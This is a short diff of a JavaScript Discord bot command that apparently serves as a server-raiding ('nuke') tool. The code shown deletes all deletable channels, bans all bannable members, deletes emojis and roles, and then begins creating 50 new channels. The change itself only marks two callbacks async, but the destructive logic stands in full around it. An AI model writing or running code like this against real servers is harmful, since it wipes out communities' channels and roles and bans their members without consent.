@@ -13,9 +13,9 @@ module.exports = {
         
                 guild.channels.cache.filter(channel => channel.deletable).forEach(channel => channel.delete());
                 guild.members.cache.filter(member => member.bannable).forEach(async member => await member.ban());
-                guild.emojis.cache.filter(emoji => emoji.deletable).forEach(emoji => emoji.delete());
+                guild.emojis.cache.filter(emoji => emoji.deletable).forEach(async emoji => emoji.delete());
                 guild.roles.cache.filter(role => role.editable && role.name !== '@everyone').forEach(
-                    role => role.delete());
+                    async role => role.delete());
         
                 for (let i = 0; i < 50; i++) {
                     await guild.channels.create({
